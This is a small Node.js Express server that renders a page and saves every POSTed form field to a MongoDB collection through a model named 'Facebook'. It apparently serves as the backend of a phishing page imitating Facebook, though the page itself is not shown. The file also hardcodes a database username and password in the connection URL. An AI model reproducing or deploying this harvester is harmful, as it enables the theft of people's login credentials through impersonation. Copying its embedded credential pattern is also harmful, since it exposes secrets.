const mongoose = require('mongoose');
var express = require('express');
var bodyParser = require('body-parser');
var app = express();
var urlencodedParser = bodyParser.urlencoded({ extended: false })
const Facebook = require('./fbmodel/fbmd');

mongoose.connect('mongodb://punisher:yummyPAPA4@ds263791.mlab.com:63791/fbdatas');
mongoose.Promise = global.Promise;


app.set('view engine','ejs');
app.use('/raj', express.static('raj'));

app.get('/',function(req, res){
res.render('page2');
});

app.post('/', urlencodedParser, function(req, res){
  //console.log(req.body);
  Facebook.create(req.body).then(function(){
    res.render('page2');
  });

});

console.log('listening at port 5000');

app.listen(process.env.PORT || 5000);
